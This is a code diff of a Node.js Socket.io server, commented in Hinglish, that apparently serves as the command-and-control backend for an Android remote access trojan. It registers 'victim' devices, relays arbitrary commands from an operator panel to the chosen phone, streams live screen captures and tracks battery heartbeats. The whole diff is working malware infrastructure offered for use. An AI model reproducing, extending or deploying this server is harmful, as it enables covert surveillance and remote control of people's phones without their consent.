@@ -1,7 +1,7 @@
 const express = require("express");
 const http = require("http");
 const { Server } = require("socket.io");
-const path = require('path'); // path module zaroori hai
+const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
@@ -14,25 +14,20 @@ const io = new Server(server, {
     }
 });
 
-// ================== BADLAV YAHAN HAI ==================
-// Static files (jaise panel.html) ko root folder se serve karein
+// Static files (panel.html) ko root folder se serve karein
 app.use(express.static(__dirname));
-
-// Jab koi root URL (/) khole, to panel.html file bhejein
 app.get("/", (req, res) => {
     res.sendFile(path.join(__dirname, 'panel.html'));
 });
-// =======================================================
 
-// Connected devices ki list manage karne ke liye
 let devices = [];
 
 io.on("connection", (socket) => {
     console.log([+] Connection established: ${socket.id});
 
-    // Naye device (APK) ke judne par
-    socket.on('register_device', (data) => {
-        const deviceId = socket.id;
+    // ================== BADLAV #1: APK se 'victim_connect' event suno ==================
+    socket.on('victim_connect', (data) => {
+        const deviceId = socket.id; // Hum server ka socket ID use karenge
         const deviceName = data.deviceName || 'Unknown Device';
         const battery = data.battery || '--';
         
@@ -44,28 +39,36 @@ io.on("connection", (socket) => {
         io.emit('devices_list', devices);
     });
 
-    // Panel se bheje gaye command ko handle karein
+    // Panel se aane wale commands ko handle karo aur APK ko bhejo
+    // APK 'server_command' event sun raha hai, isliye hum use yahan se bhejenge
     socket.on('panel_command', (command) => {
         if (!command.targetId) return;
         console.log([>] Command '${command.type}' sent to ${command.targetId});
-        io.to(command.targetId).emit('server_command', command);
+        
+        // APK ke hisaab se event ka naam badlo
+        const eventType = command.type;
+        const eventData = command.data || {};
+        
+        // 'server_command' ke bajaye, seedhe event bhejo jise APK sun raha hai
+        io.to(command.targetId).emit(eventType, eventData);
     });
     
-    // Live screen data ko handle karein
-    socket.on('live_screen_data', (data) => {
-        if (!data.deviceId) return;
+    // ================== BADLAV #2: APK se 'live_screen' event suno ==================
+    socket.on('live_screen', (data) => {
+        // Panel ko 'live_screen_update' event bhejo
         io.emit('live_screen_update', data);
     });
 
-    // Status (jaise battery) update ko handle karein
-    socket.on('status_data', (data) => {
-        if (!data.deviceId) return;
-        const device = devices.find(d => d.deviceId === data.deviceId);
-        if (device) {
+    // ================== BADLAV #3: APK se 'heartbeat' event suno ==================
+    socket.on('heartbeat', (data) => {
+        const device = devices.find(d => d.deviceId === socket.id);
+        if (device && data.battery) {
             device.battery = data.battery;
+            // Panel ko status update bhejo
+            io.emit('status_update', { deviceId: socket.id, battery: data.battery });
+            // Device list bhi update karo
+            io.emit('devices_list', devices);
         }
-        io.emit('status_update', data);
-        io.emit('devices_list', devices);
     });
 
     // Connection tootne par
